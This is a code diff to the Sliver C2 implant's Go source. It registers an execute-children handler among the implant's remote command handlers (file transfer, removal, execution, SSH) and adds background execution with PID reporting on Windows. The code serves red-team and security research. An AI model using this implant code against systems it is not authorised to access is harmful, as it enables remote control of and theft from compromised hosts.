@@ -96,21 +96,22 @@ var (
 		sliverpb.MsgMountReq:               mountHandler,
 
 		// Generic
-		sliverpb.MsgPing:           pingHandler,
-		sliverpb.MsgLsReq:          dirListHandler,
-		sliverpb.MsgDownloadReq:    downloadHandler,
-		sliverpb.MsgUploadReq:      uploadHandler,
-		sliverpb.MsgCdReq:          cdHandler,
-		sliverpb.MsgPwdReq:         pwdHandler,
-		sliverpb.MsgRmReq:          rmHandler,
-		sliverpb.MsgMvReq:          mvHandler,
-		sliverpb.MsgCpReq:          cpHandler,
-		sliverpb.MsgMkdirReq:       mkdirHandler,
-		sliverpb.MsgExecuteReq:     executeHandler,
-		sliverpb.MsgReconfigureReq: reconfigureHandler,
-		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
-		sliverpb.MsgChtimesReq:     chtimesHandler,
-		sliverpb.MsgGrepReq:        grepHandler,
+		sliverpb.MsgPing:               pingHandler,
+		sliverpb.MsgLsReq:              dirListHandler,
+		sliverpb.MsgDownloadReq:        downloadHandler,
+		sliverpb.MsgUploadReq:          uploadHandler,
+		sliverpb.MsgCdReq:              cdHandler,
+		sliverpb.MsgPwdReq:             pwdHandler,
+		sliverpb.MsgRmReq:              rmHandler,
+		sliverpb.MsgMvReq:              mvHandler,
+		sliverpb.MsgCpReq:              cpHandler,
+		sliverpb.MsgMkdirReq:           mkdirHandler,
+		sliverpb.MsgExecuteReq:         executeHandler,
+		sliverpb.MsgExecuteChildrenReq: executeChildrenHandler,
+		sliverpb.MsgReconfigureReq:     reconfigureHandler,
+		sliverpb.MsgSSHCommandReq:      runSSHCommandHandler,
+		sliverpb.MsgChtimesReq:         chtimesHandler,
+		sliverpb.MsgGrepReq:            grepHandler,
 
 		// Extensions
 		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
@@ -386,7 +387,7 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 		}
 	}
 
-	if execReq.Output {
+	if execReq.Output && !execReq.Background {
 		stdOutBuff := new(bytes.Buffer)
 		stdErrBuff := new(bytes.Buffer)
 		stdErr = stdErrBuff
@@ -443,12 +444,18 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 		}
 		execResp.Stderr = stdErrBuff.Bytes()
 		execResp.Stdout = stdOutBuff.Bytes()
+		if cmd.Process != nil {
+			execResp.Pid = uint32(cmd.Process.Pid)
+		}
 	} else {
-		err = cmd.Start()
-		if err != nil {
+		pid, startErr := startExecuteChild(cmd, execReq.Background, exePath, execReq.Args, execReq.Stdout, execReq.Stderr)
+		if startErr != nil {
 			execResp.Response = &commonpb.Response{
-				Err: fmt.Sprintf("%s", err),
+				Err: fmt.Sprintf("%s", startErr),
 			}
+		}
+		if pid != 0 {
+			execResp.Pid = uint32(pid)
 		}
 	}
 	data, err = proto.Marshal(execResp)
